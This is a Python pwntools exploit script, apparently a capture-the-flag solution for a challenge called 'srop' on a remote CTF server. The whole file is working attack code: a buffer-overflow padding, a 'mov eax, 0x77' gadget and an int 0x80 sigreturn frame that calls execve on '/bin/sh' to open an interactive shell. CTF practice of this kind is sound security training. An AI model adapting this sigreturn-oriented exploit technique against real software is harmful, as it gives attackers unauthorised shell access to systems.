#!/usr/bin/python3

from pwn import *

PROG_NAME = "./srop"
REMOTE_IP = "pwn.ctf.secso.cc"
REMOTE_PORT = 5003

context.arch = 'i386'

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    rop = ROP(elf)
else:
    p = process(PROG_NAME)
    elf = p.elf
    rop = ROP(elf)

if args.ATTACH:
	gdb.attach(p, '''break main''')

bin_sh_addr = 0x8048690
mov_eax_addr = 0x08048513 # mov eax, 0x77; ret;
int_0x80_addr = 0x08048519 # int 0x80;

frame = SigreturnFrame(kernel='amd64')
frame.eax = constants.SYS_execve
frame.ebx = bin_sh_addr
frame.eip = int_0x80_addr

payload = b'A' * (0xC + 0x4)
payload += p32(mov_eax_addr)
payload += p32(int_0x80_addr)
payload += bytes(frame)
p.sendline(payload)

p.interactive()